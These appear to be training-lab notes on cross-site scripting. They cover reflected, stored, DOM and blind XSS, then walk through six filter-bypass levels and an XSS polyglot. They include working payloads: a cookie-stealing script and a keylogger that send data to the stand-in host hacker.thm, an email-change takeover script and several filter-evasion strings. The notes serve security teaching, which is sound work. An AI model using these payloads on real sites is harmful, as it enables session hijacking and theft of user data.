# XSS Payloads

## What is a payload?

- **Payload in XSS**: JavaScript code executed on the target's computer.
- **Two parts**:
    - **Intention**: Desired action of the JavaScript.
    - **Modification**: Code changes for execution in different scenarios.

## Examples of XSS Intentions

### Proof Of Concept

- Demonstrate XSS by showing an alert box.
    ```html
    <script>alert('XSS');</script>
    ```

### Session Stealing

- Steal user's session by sending their cookie to an attacker's site.
    ```html
    <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    ```

### Key Logger

- Log keystrokes and send them to an attacker's site.
    ```html
    <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
    ```

### Business Logic

- Change user's email address via JavaScript.
    ```html
    <script>user.changeEmail('attacker@hacker.thm');</script>
    ```
    - Allows for a reset password attack.

## Reflected XSS

- Occurs when user data in an HTTP request is included in the webpage source without validation.

### Example Scenario

- Error message on incorrect input taken from query string parameter.
- No content check allows malicious code insertion.

### Potential Impact

- Attacker can send links or embed iframes with JavaScript payloads.
- Victims may execute code, revealing session or customer information.

### How to test for Reflected XSS

- Test all entry points:
    - URL Query String parameters
    - URL File Path
    - Sometimes HTTP Headers (rarely exploitable)

## Stored XSS

### What is Stored XSS?

- XSS payload is stored on the web application (e.g., in a database).
- Payload runs when other users visit the site or web page.

### Example Scenario

- A blog website allows users to post comments.
- Comments aren't checked for JavaScript or malicious code.
- Malicious comment with JavaScript is stored in the database.
- Every user visiting the article runs the JavaScript in their browser.

### Potential Impact

- Redirect users to another site.
- Steal user's session cookie.
- Perform actions on the website as the visiting user.

### How to Test for Stored XSS

- Test every possible entry point where data is stored and shown to other users:
    - Comments on a blog.
    - User profile information.
    - Website listings.
- Developers may limit input values on the client-side, but manually sending requests can bypass this.
- Confirm that your JavaScript payload runs successfully where the data is reflected.

## DOM Based XSS

### What is the DOM?

- DOM stands for Document Object Model and is a programming interface for HTML and XML documents.
- Represents the page so that programs can change the document structure, style, and content.
- A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

### Exploiting the DOM

- DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
- Execution occurs when the website JavaScript code acts on input or user interaction.

### Example Scenario

- The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently viewed section.
- The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

### Potential Impact

- Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

### How to test for DOM Based XSS

- DOM Based XSS can be challenging to test for and requires knowledge of JavaScript to read the source code.
- Look for parts of the code that access variables an attacker can control, such as `window.location.x` parameters.
- Check how these values are handled and whether they are written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.

## Blind XSS

Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

### Example Scenario

- A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

### Potential Impact

- Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

### How to test for Blind XSS

- When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
- A popular tool for Blind XSS attacks is XSS Hunter Express. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

## Perfecting your payload

The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.

Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.

How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use. To Explain this, click the green Start Machine button on the right, and when the machine has loaded, open the below link in a new tab.

https://10-10-21-127.p.thmlabs.com

The aim for each level will be to execute the JavaScript alert function with the string THM, for example:

```html
<script>alert('THM');</script>
```

### Level One

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:

If you view the Page Source, You'll see your name reflected in the code:

Instead of entering your name, we're instead going to try entering the following JavaScript Payload: `<script>alert('THM');</script>`

Now when you click the enter button, you'll get an alert popup with the string THM and the page source will look like the following:

And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### Level Two

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload: `"><script>alert('THM');</script>`

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### Level Three

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the textarea tag.

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: `</textarea><script>alert('THM');</script>`

This turns this:

Into This:

The important part of the above payload is `</textarea>`, which causes the textarea element to close so the script will run.

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### Level Four

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload `';alert('THM');//` which you'll see from the below screenshot will execute your code. The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### Level Five

Now, this level looks the same as level one, and your name also gets reflected in the same place. But if you try the `<script>alert('THM');</script>` payload, it won't work. When you view the page source, you'll see why.

The word `script` gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words.

When a word gets removed from a string, there's a helpful trick that you can try.

Original Payload:
```html
<sscriptcript>alert('THM');</sscriptcript>
```

Text to be removed (by the filter):
```html
<sscriptcript>alert('THM');</sscriptcript>
```

Final Payload (after passing the filter):
```html
<script>alert('THM');</script>
```

Try entering the payload `<sscriptcript>alert('THM');</sscriptcript>` and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.

### Level Six

Similar to level two, where we had to escape from the value attribute of an input tag, we can try `"><script>alert('THM');</script>`, but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.

You can see that the `<` and `>` characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. The onload event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful; with this being the last level, you'll receive a flag that can be entered below.

## Polyglots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
